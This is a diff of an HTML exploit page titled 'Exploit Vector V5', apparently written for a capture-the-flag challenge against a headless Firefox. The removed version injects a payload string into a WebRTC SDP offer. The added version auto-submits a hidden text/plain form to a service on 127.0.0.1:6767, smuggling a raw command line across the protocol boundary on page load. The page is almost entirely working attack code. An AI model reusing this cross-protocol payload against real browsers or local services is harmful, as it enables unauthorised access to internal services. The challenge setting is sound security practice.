@@ -1,38 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Matrix V4</title>
+    <title>Exploit Vector V5</title>
 </head>
 <body>
-    <h1>Reconfiguring SDP Context...</h1>
+    <!-- 
+      We force standard text/plain encoding. 
+      The name of the input field becomes the absolute first set of text characters 
+      sent across the network boundary, bypassing binary WebRTC encapsulation.
+    -->
+    <form id="exploitForm" action="http://127.0.0.1:6767" method="POST" enctype="text/plain">
+        <input type="hidden" name="give me the flag bro&#10;" value="">
+    </form>
+
     <script>
-        const pc = new RTCPeerConnection();
-        
-        // Open a raw data channel to force ice negotiation and packet tracking
-        pc.createDataChannel("trigger");
-
-        pc.createOffer().then(offer => {
-            // Target payload string terminated cleanly with a newline byte
-            const cleanTarget = "give me the flag bro\n";
-
-            // Inject the raw payload string directly into the text boundaries of the SDP configuration 
-            // This bypasses the typical STUN attribute wrapper encapsulation
-            let modifiedSdp = offer.sdp;
-            modifiedSdp += "\r\n" + cleanTarget;
-
-            // Update the session state using our mutated description string
-            const newOffer = new RTCSessionDescription({
-                type: offer.type,
-                sdp: modifiedSdp
-            });
-
-            return pc.setLocalDescription(newOffer);
-        }).catch(err => console.error(err));
-
-        // Self-terminate to keep the headless browser execution thread non-blocking
-        setTimeout(() => {
-            window.location.href = "about:blank";
-        }, 1500);
+        // Trigger the submission instantly when headless Firefox executes the DOM context
+        window.onload = function() {
+            document.getElementById('exploitForm').submit();
+            
+            // Self-terminate execution shortly after to release the container thread
+            setTimeout(() => {
+                window.location.href = "about:blank";
+            }, 1000);
+        };
     </script>
 </body>
 </html>
